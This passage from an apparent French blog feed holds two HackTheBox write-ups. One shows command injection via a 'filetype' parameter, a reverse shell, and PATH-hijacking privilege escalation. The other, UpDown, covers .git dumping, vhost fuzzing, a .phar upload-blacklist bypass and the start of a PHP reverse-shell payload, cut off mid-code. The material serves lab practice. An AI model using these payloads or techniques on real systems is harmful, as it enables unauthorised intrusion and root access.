<p>Sur le <code>/printer</code>, la seule chose qui saute aux yeux est le gros bouton rouge en bas de la page. En cliquant dessus, on se rend compte qu&rsquo;il envoie une requête <code>POST</code> vers <code>/printer</code></p>
<p>On lance donc <code>Burp</code> pour intercépter la requête.</p>
<p><img src="https://i.ibb.co/MnmgTDj/image.png" alt="request.png"></p>
<p>On voit 3 paramètres: la photo, le filetype et enfin les dimensions</p>
<p>Si on change manuellement les dimensions dans la requête à <code>100x100</code>, le site nous télécharge une version de l&rsquo;image en <code>100x100</code>, on comprend donc que l&rsquo;image est générée dynamiquement au moment de la requête</p>
<p>On peut imaginer une commande du style</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>generateImage -path photo -type filetype -size dimensions
</span></span></code></pre></div><p>Où bien sûr nos trois arguments sont passés par la requête.</p>
<p>En partant donc ce cela et en assumant qu&rsquo;il s&rsquo;agit d&rsquo;une commande bash, on peut tenter une code execution en ajoutant un <code>;</code> à la fin d&rsquo;un des paramètres.</p>
<p>Le problème, c&rsquo;est que nous ne savons pas lequel des 3 paramètres est le dernier de la commande. On va donc tenter sur chacun des paramètres jusqu&rsquo;à trouver lequel est mis en dernier, pour que la commande ressemble par exemple à:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>generateImage -path photo.png -type png -dimensions 100x100;id
</span></span></code></pre></div><p>Cette ligne va éxecuter deux commandes: <code>generateImage</code> et <code>id</code></p>
<p><img src="https://i.ibb.co/V2GXWbj/image.png" alt="req1.png"></p>
<p>Le site renvoie un <code>500</code>, car il n&rsquo;a pas trouvé l&rsquo;image, l&rsquo;argument <code>photo</code> n&rsquo;est donc pas injectable.</p>
<p>On enlève le payload sur ce dernier, et on renvoie la requête</p>
<p><img src="https://i.ibb.co/L9CJLMX/image.png" alt="req2.png"></p>
<p>Nouvelle réponse <code>500</code>, cette fois les dimensions sont invalides. En revanche, il n&rsquo;a rien dit sur le <code>filetype</code>, on sait donc maintenant que notre commande ressemble plutôt à:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>generateImage -path photo.png -dimensions 100x100 -type png;id
</span></span></code></pre></div><p>Pour vérifier ça, on héberge rapidement un serveur python qu&rsquo;on va curl via notre payload</p>
<p><img src="https://i.ibb.co/hXx07gC/image.png" alt="hack.png"></p>
<p>Et ça fonctionne, on a reçu la requête sur notre serveur, on a donc notre code execution.</p>
<p>On va reverse shell la machine, pour ce faire on build un reverse shell qu&rsquo;on url encode et qu&rsquo;on met à la suite de notre <code>;</code>. On lance un <code>netcat</code> puis on envoie la requête.</p>
<p><img src="https://i.ibb.co/GkR5JLt/image.png" alt="revshell.png"></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Après avoir stabilisé notre shell, on fait un <code>sudo -l</code> et on voit que l&rsquo;utilisateur <code>wizard</code> pour utiliser sudo sur le fichier <code>cleanup.sh</code>. Il peut aussi modifier les variables d&rsquo;environnement au lancement du programme. (<code>SETENV</code>)</p>
<p><img src="https://i.ibb.co/BV9jm5v/image.png" alt="sudol.png"></p>
<p>On cat le <code>cleanup.sh</code> pour voir ce qu&rsquo;il y a dedans, et on remarque que le script fait appel à plusieurs commandes <code>bash</code>. En revanche, il les appelle toutes avec leur chemin absolu (<code>/bin/cat</code>) sauf pour <code>find</code></p>
<p><img src="https://i.ibb.co/xH6QWz3/image.png" alt="cleanup.png"></p>
<p>On part sur une <code>path hijacking</code> de la commande <code>find</code>, on crée donc un fichier <code>find</code> dans lequel on écrit <code>/bin/bash</code>, puis on le met dans <code>tmp</code>. Enfin, on lui met toutes les permissions (<code>7</code> = <code>RWX</code>).</p>
<p><img src="https://i.ibb.co/3FyCRsQ/image.png" alt="pathhijacking.png"></p>
<p>Puis on lance <code>cleanup.sh</code> avec <code>sudo</code> en modifiant la variable d&rsquo;environnement <code>$PATH</code> pour qu&rsquo;il aille d&rsquo;abord chercher la commande <code>find</code> dans le <code>/tmp</code>.</p>
<p><img src="https://i.ibb.co/bzgY1tV/image.png" alt="root.png"></p>
<p>gg!</p>
<h6 id="back-to-top"><a href="#"><em>back to top</em></a></h6>
]]></content>
        </item>
        
        <item>
            <title>📙 HackTheBox - UpDown</title>
            <link>/posts/2023/01/hackthebox-updown/</link>
            <pubDate>Sat, 21 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/hackthebox-updown/</guid>
            <description>Table of contents Recon
Foothold
Lateral Move
Privilege Escalation
Note Deuxième writeup sur HTB, il a lui aussi été fait il y a longtemps donc c&amp;rsquo;est possible que j&amp;rsquo;ai dit des bêtises, et il y a beaucoup de screens.
Néanmoins, c&amp;rsquo;était un room assez sympathique avec une méchanique bien trouvée, je l&amp;rsquo;ai bien aimée.
Recon Comme d’habitude, on lance:
nmap -A siteisup.htb Aucun port anormal d’ouvert, on va donc se concentrer sur le site et le résultat du dirbuster</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="#recon">Recon</a></p>
</li>
<li>
<p><a href="#foothold">Foothold</a></p>
</li>
<li>
<p><a href="#lateral-move">Lateral Move</a></p>
</li>
<li>
<p><a href="#privilege-escalation">Privilege Escalation</a></p>
</li>
</ul>
<hr>
<h1 id="note">Note</h1>
<p>Deuxième writeup sur HTB, il a lui aussi été fait il y a longtemps donc c&rsquo;est possible que j&rsquo;ai dit des bêtises, et il y a <strong>beaucoup</strong> de screens.</p>
<p>Néanmoins, c&rsquo;était un room assez sympathique avec une méchanique bien trouvée, je l&rsquo;ai bien aimée.</p>
<h1 id="recon">Recon</h1>
<p>Comme d’habitude, on lance:</p>
<pre tabindex="0"><code>nmap -A siteisup.htb
</code></pre><p><img src="https://user-images.githubusercontent.com/77807503/206527826-488caf7c-940b-47c7-8a76-00864772cff0.png" alt="2022-12-08-174744_930x1026_scrot"></p>
<p>Aucun port anormal d’ouvert, on va donc se concentrer sur le site et le résultat du <strong>dirbuster</strong></p>
<pre tabindex="0"><code>dirb http://siteisup.htb
</code></pre><p><img src="https://user-images.githubusercontent.com/77807503/206527923-48203d18-d216-456d-8a4c-ddee1251a001.png" alt="2022-12-08-175753_930x1026_scrot"></p>
<p>Bon là c’est assez évident, le <strong>/.git</strong> a rien à faire ici, donc on va utiliser <code>git-dumper</code> pour récupérer tout les fichiers qui s&rsquo;y trouvent</p>
<pre tabindex="0"><code>git-dumper http://siteisup.htb/dev/.git/ git/
</code></pre><p>On se retrouve donc avec ceci</p>
<p><img src="https://user-images.githubusercontent.com/77807503/206528038-8f13afd8-4545-49c8-8fcc-33529f0fa675.png" alt="2022-12-08-180406_949x511_scrot"></p>
<p>On affiche la liste des commits faits au repo</p>
<pre tabindex="0"><code>git log
</code></pre><p><img src="https://user-images.githubusercontent.com/77807503/206528076-8f395db5-a2a8-46e8-ba09-23af28c14d2d.png" alt="2022-12-08-180622_1920x1080_scrot"></p>
<p>Il y en a beaucoup, mais le seul qui sort du lot est le “<strong>New technique in header to protect our dev vhost</strong>.”</p>
<p>Regardons les modifications qu’ont apportées ce commit</p>
<pre tabindex="0"><code>git show 8812785e31c879261050e72e20f298ae8c43b565
</code></pre><p>On voit que c’est une modification du <code>.htaccess</code>, qui change les settings du serveur pour que seules les connections avec le header <code>Special-Dev: only4dev</code> soient acceptées</p>
<p><img src="https://user-images.githubusercontent.com/77807503/206528162-4af06057-14dc-426c-9b21-29a4c197ca1a.png" alt="2022-12-08-180809_751x369_scrot"></p>
<p>Mais le serveur principal fonctionnait très bien sans ce header, donc le <code>.htacces</code> doit probablement agir sur un sous domaine</p>
<p>On va donc fuzz les sous domaines</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/wfuzz/wordlist/general/common.txt -u &#34;http://siteisup.htb&#34; -H &#34;Host: FUZZ.siteisup.htb&#34; -fs 1131
</code></pre><p><img src="https://user-images.githubusercontent.com/77807503/206528465-39209d8b-75f6-4fef-8744-8811f5ea0ac6.png" alt="2022-12-08-181009_1888x1032_scrot"></p>
<p>Il existe donc un sous domaine: <code>dev.siteisup.htb</code></p>
<p>Pour s’y rendre, on active le proxy burpsuite, puis on désactive l’intercepter</p>
<p>On crée ensuite un <em>Match and Replace</em> dans les options du proxy, qui va ajouter le header à toutes nos requêtes</p>
<p><img src="https://user-images.githubusercontent.com/77807503/206528696-1e6689a6-3153-4e4f-9368-ef3bc09add13.png" alt="2022-12-08-181210_962x1061_scrot"></p>
<p><code>dev.siteisup.htb</code> est une sorte de panel administrateur, où on peut entrer une liste d’urls à checker</p>
<p><img src="https://user-images.githubusercontent.com/77807503/206528979-1cec3862-2861-4c81-a13e-aa5ea37f32c2.png" alt="2022-12-08-181327_930x1026_scrot"></p>
<h1 id="foothold">Foothold</h1>
<p>Mais c’est surtout un sous domaine dont on a le code source dans le .git, donc on va aller y jeter un oeil</p>
<p>L’index include juste checker ou le fichier en fonction du lien avec un filtre pour les LFI, on va regarder dans <code>checker</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">This</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">only</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">developers</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?page=admin&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Admin</span> <span style="color:#a6e22e">Panel</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;DIRECTACCESS&#34;</span>,<span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>	$page<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($page <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bin|usr|home|var|etc/i&#34;</span>,$page)){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.php&#34;</span>);
</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;checker.php&#34;</span>);
</span></span><span style="display:flex;"><span>	}	
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>C’est le fichier qui gère l’upload et le check de la liste d’urls, c’est là qu’on verra les eventuels filtres et ce qu’il se passe quand on lui upload un fichier</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># File size must be less than 10kb.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10000</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;File too large!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if extension is allowed.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">getExtension</span>($file);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;</span>,$ext)){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Extension not allowed!&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Create directory to upload our file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>())<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mkdir</span>($dir, <span style="color:#ae81ff">0770</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Upload the file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $final_path <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$file;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$final_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Read the uploaded file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $websites <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#a6e22e">file_get_contents</span>($final_path));
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span>($websites <span style="color:#66d9ef">as</span> $site){
</span></span><span style="display:flex;"><span>                $site<span style="color:#f92672">=</span><span style="color:#a6e22e">trim</span>($site);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#file://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#data://#i&#34;</span>,$site) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#ftp://#i&#34;</span>,$site)){
</span></span><span style="display:flex;"><span>                        $check<span style="color:#f92672">=</span><span style="color:#a6e22e">isitup</span>($site);
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>($check){
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                        }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;</span><span style="color:#e6db74">{</span>$site<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                        }       
</span></span><span style="display:flex;"><span>                }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete the uploaded file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($final_path);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>On sait donc que:</p>
<ul>
<li>Le fichier qu’on upload ne peut pas faire plus de 10Kb</li>
<li>Son extention ne doit pas être dans la blacklist</li>
<li>Quand on upload un fichier, il est stocké dans /uploads</li>
<li>Il est lu en entier, chaque url est checké puis le fichier est supprimé</li>
</ul>
<p>Tout d’abord le premier filtre n’est pas un problème puisque la plupart des reverse shell en php font moins de 10Kb</p>
<p>Ensuite, le danger des blacklists, c’est oublier une extention, en l’occurence ici, l’extention <strong><strong><strong><strong><strong>.phar</strong></strong></strong></strong></strong> n’est pas blacklist, on va donc pouvoir upload des fichiers php qui seront lus</p>
<p>Enfin, pour éviter que le fichier soit supprimé directement, on va lui donner une grande quantité d’urls à check, pour que ça prenne plus de temps</p>
<p>On crée donc notre <strong><strong><strong><strong><strong><strong><strong><strong>payload.phar</strong></strong></strong></strong></strong></strong></strong></strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ebay</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">t</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tmall</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">br</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">360.</span><span style="color:#a6e22e">cn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sohu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jp</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">pinterest</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">netflix</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">it</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">microsoft</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">es</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wordpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmw</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tumblr</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">paypal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogspot</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imgur</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">stackoverflow</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">aliexpress</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">naver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ok</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ru</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apple</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">github</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">chinadaily</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">imdb</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">kr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fc2</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">jd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">blogger</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#ae81ff">163.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ca</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">whatsapp</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">amazon</span><span style="color:#f92672">.</span><span style="color:#a6e22e">in</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">office</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tianya</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">google</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Upload reverse-shell, bypass exec(), shell_exec(), system(), fsockopen(), passthru()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>),  
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>),
